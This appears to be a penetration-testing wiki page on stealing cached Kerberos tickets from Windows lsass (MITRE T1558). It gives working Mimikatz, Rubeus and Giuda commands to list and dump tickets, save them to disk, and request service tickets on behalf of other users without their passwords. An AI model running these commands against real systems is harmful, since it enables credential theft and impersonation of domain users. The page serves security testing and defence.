---
description: MITRE ATT&CK™ Steal or Forge Kerberos Tickets - Technique T1558
---

# Cached Kerberos tickets

## Theory

In Windows, [Kerberos](../../../persistence/kerberos/) tickets are **handled and stored by the** [**lsass** (Local Security Authority Subsystem Service)](lsass/) process, which is responsible for security. Hence, to retrieve tickets from a Windows system, it is necessary to **communicate with lsass and ask for them**. As a **non-administrative user only owned tickets can be fetched**, however, as machine **administrator**, **all** of them can be harvested using tools like **Mimikatz, Rubeus** or **Giuda.**

## Practice

### Enumerate

{% tabs %}
{% tab title="Klist" %}
[Klist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist) is a native Windows tool that can display a list of currently cached Kerberos tickets.&#x20;

```powershell
#Enumerate TGT and TGS
klist tickets

#Enumerate sessions
klist sessions
```
{% endtab %}

{% tab title="Rubeus" %}
[Rubeus](https://github.com/GhostPack/Rubeus) can be use to enumerate tickets&#x20;

```powershell
.\Rubeus.exe triage
```
{% endtab %}
{% endtabs %}

### Dump tickets

{% tabs %}
{% tab title="Mimikatz" %}
[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be use to dump TGTs from the LSASS process

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
{% endtab %}

{% tab title="Rubeus" %}
[Rubeus](https://github.com/GhostPack/Rubeus) can also be use to dump TGTs from the LSASS process

```powershell
# Dump all tickets
.\Rubeus dump

# Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap

# Write ticket to disk
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
{% endtab %}
{% endtabs %}

### Ask a TGS

Using tools like **Giuda ,** we can avoid dumping LSASS memory. With the [SeTcbPrivilege](../../../../windows/privesc/abusing-tokens.md#setcbprivilege), we can read LSA storage, extract the SESSION KEY from TGT, and forge a request asking for a TGS; We must use LUID instead of Username.

{% tabs %}
{% tab title="Giuda" %}
[Giuda](https://github.com/foxlox/GIUDA) can be use to requests a TGS on behalf of another user (without password)

```powershell
#Request a TGS
.\guida.exe -gettgs -luid:<LogonID> -msdsspn:<SPN>

#Example
.\guida.exe -gettgs -luid:0x1875dc -msdsspn:HOST/dc01.lab.local
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows" %}
